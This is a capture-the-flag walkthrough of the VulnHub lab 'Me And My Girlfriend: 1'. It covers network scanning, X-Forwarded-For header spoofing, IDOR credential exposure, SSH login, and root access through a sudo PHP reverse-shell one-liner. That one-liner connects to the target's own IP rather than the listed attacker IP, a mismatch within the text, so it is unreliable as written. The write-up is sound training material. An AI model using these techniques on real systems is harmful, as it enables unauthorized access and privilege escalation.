=== Write-up ===
NAME: Me And My Girlfriend: 1
LINK: https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/
DIFFICULTY-LEVEL: Beginner

=== PROGRAMS USED ===
1. NMAP
2. NETDISCOVER
3. NETCAT
4. Burpsuite

=== STEPS ===
1.  Scan Network to obtain device ip to identify virtual machine
2.  Scan Device
3.  View Website running on port 80
4.  Login 
5.  Find & Exploit Vulnerability
	5.1. Obtain Login Credentials
6.  Connect to virtual machine via ssh
7.  Obtain Flag 1
8.  Obtain Root & Flag 2

=== Scan Network to obtain Device IP ===
First we need to scan the network to obtain look for the virtual machine. I 
used netdiscover to capture all ip address. Netdiscover uses arp to discover 
ip addresses on networks. Command used: `netdiscover -r 192.168.2.0/24`. Three 
IP address are found Host machine, Kali VM, & Me And My Girlfriend: 1 VM -> MAME1 VM. 
Below are the IP addresses found.

		------------------------------
		NAME		IP
		------------------------------
		HOST MACHINE	192.168.2.12
		KALI VM		192.168.2.18
		MAME1 VM	192.168.2.17
		-----------------------------
   Above table show names and ip address of scanned devices.

=== Scan Device === 
Now that we have the device IP address we can use Nmap to scan the device for 
open ports. Command used `nmap -sC -sV -oA `~/nmap/mame1/mame1.nmap 192.168.2.17`. 
Flags explained below

-sC	Default Scripts
-sV	Version Enumeration
-oA	Output All Formats (.nmap, .xml, gnamp)

Nmap shows that ssh on port 22 and http apache server on port 80 are running.

=== View Website running on port 80 ===
The website is running on port 80. I accessed the website, the website displays
the following error "Who are you? Hacker? Sorry This Site Can Only Be Accessed local!".
I inspected the source code of the page and it had a clue in the comment 
'<!--Maybe you can search how to use x-forwarded-for -->'.  x-forwarded-for is 
used to tell the site the ip address of the client. All request made to the 
site must be localhost so, I used Burpsuite to edit all the requests to include 
the `x-forwarded-for: localhost` to spoof my ip. I reload the page and its shows 
the Home page, on the page there are four options Home, Login, Register, and About. 
I opened Login page and it presented with a login form. Since, I did not
have the credentials I opened the Register page. Signed up and then went back 
to the login page. I logged in with my credentials clicked on profile its 
showed all information used to login. I then notice that the site used get 
requests and so I was able to see the parameters of the page. The site passed 
two parameters page=profile and user_id=12. Since, my id is 12 I assumed that ids 
are not randomized and are easily predictable. So, I started changing the user_id 
parameter starting from 1. When I reached user_id 5 it showed a profile with
the username alice, I knew it was Alice's account and used Inspect Element to 
view the the password fields value which was '4lic3'.

=== Connecting to MAME1 VM === 
Now that I have the login credentials I can try connecting to the machine via 
ssh which was found running on port 22 during the NMAP scan. Using the credeintials 
I successfully able to connect. 

=== Obtaining Flag1 ===
I tried using `ls` to list directories I did not show anything so, guessed
it was using the '.' prefix to hide the files and I was right when I used `ls -la` 
which displayed all files in a list. One of the hidden directories was '.my_secret'
I changed my directory to it it had two fiels flag1.txt and my_notes.txt. flag1.txt
had the flag and my_notes.txt contained a note from Alice regarding how she likes
the company and her relationship with bob. 

=== Obtaining Root & Flag2  === 
The second flag is found in the 
'/root/' directory in file named flag2.txt. Alice's account does not have permission
to view the file (tried using cat to view the flag2.txt) Now I need to obtain root 
permission to view the file, I used `sudo -l` to list the user permissions. I have 
standard access and root access to /usr/bin/php. So, I know that I need to use php 
to gain root. I used a php reverse shell script found php shell on pentest monkey's
website (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) so 
I changed the command to 
`sudo /usr/bin/php -r '$sock=fsockopen("192.168.2.17",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
now on the Kali VM I used netcat to listen for connection. Now I have root account. I used 
`whoami` to check. and then used cat to view the content of the flag2.txt file.






















